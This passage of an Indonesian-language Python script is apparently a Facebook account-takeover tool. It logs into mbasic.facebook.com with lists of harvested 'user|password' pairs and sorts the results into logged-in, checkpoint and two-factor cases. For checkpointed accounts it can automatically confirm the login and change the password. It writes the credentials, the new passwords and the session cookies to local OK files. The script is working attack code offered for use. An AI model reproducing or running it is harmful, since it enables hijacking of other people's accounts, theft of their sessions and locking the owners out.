		print("%s%s\033[0m%s"%(U,til,file));jeda(0.07)
	try:
		print("\n%s%s%s\033[0m Masukan file [ cth%s: %sCP-%s.txt%s ]"%(U,til,O,M,K,waktu,O))
		opsi()
	except IOError:
		print ('%s%s \033[0mfile tidak ada'%(M,til))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s%s%s \033[0mNama file %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%s \033[0misi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s====================== %s#"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s====================== %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/Dhanz-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
